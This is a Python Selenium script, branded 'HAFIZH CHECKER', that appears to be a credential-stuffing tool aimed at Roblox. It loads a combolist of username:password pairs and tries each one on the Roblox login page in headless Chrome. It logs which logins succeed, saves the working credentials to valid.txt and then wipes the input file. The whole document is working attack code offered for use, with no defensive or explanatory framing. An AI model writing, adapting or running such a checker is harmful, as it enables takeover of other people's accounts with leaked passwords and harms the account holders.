from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException, TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from colorama import Fore
from time import sleep
import os

magenta = Fore.MAGENTA
red = Fore.RED
green = Fore.GREEN
reset = Fore.RESET

WINDOW_SIZE = "1280,720"
options = webdriver.ChromeOptions()
options.add_argument("--window-size=%s" % WINDOW_SIZE)
options.add_argument("--headless")
options.add_experimental_option('excludeSwitches', ['enable-logging'])
options.add_experimental_option('detach', True)

print(f"[*] {magenta}Connecting...{reset}")
sleep(3)
print(f"[*] {magenta}Connected!{reset}\n\n")

os.system("cls")
print(f"""{magenta}
##################################################
#                HAFIZH CHECKER                  #
##################################################
{reset}""")

comboName = str(input(f"{magenta}Combolist name: {reset}"))
combolist = open(comboName + ".txt", "r", encoding="utf-8").readlines()

valid_accounts = []
total = len(combolist)

for combo in combolist:
    seq = combo.strip()
    if not seq or ":" not in seq:
        continue
    acc = seq.split(":")

    username = acc[0]
    password = acc[1]

    driver = webdriver.Chrome(options=options)
    driver.get("https://www.roblox.com/Login")
    sleep(3)
    try:
        cookieBtn = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'Accept All')]")))
        cookieBtn.click()
    except (NoSuchElementException, TimeoutException):
        pass

    usernameInput = driver.find_element(By.NAME,"username")
    usernameInput.send_keys(username)
    passwordInput = driver.find_element(By.NAME,"password")
    passwordInput.send_keys(password)
    lBtn=driver.find_element(By.ID, "login-button");
    lBtn.click()
    sleep(3)
    try:
        driver.find_element(By.XPATH, "//p[@id='login-form-error']")
        driver.close()
        print(f"[!] {red}BAD: {combo.strip()} {reset}")
    except NoSuchElementException:
        print(f"[!] {green}GOOD: {combo.strip()} {reset}")
        valid_accounts.append(combo.strip())
        driver.close()

if valid_accounts:
    with open("valid.txt", "a", encoding="utf-8") as f:
        for acc in valid_accounts:
            f.write(acc + "\n")

open(comboName + ".txt", "w", encoding="utf-8").close()

print(f"\n{green}[✔] Sorted! Valid accounts saved to valid.txt{reset}")
print(f"{green}[✔] Total valid: {len(valid_accounts)}/{total} accounts{reset}")
print(f"{green}[✔] Combo file cleared.{reset}")

    
